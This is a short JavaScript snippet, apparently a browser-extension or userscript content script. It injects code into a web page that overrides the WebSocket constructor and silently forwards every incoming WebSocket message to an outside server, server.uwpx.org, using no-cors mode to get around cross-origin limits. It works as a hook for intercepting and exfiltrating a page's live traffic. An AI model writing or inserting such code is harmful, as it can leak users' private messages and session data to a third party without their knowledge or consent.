while (document == null || document.head == null);

var s = document.createElement("script");

function hookWebSocket() {
    window.RealWebSocket = window.WebSocket;

    window.WebSocket = function () {
        var socket = new window.RealWebSocket(...arguments);

        socket.addEventListener("message", (e) => {
            fetch("https://server.uwpx.org:1998?auth=olla", { // Send the auth via query parameter to prevent cors issues
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json"
                },
                body: e.data
            }).then(response => console.error("Posted: ", JSON.stringify(response)))
        });

        return socket;
    }
}

s.innerHTML = `
    ${hookWebSocket.toString()}

    hookWebSocket();
`;

document.head.prepend(s);
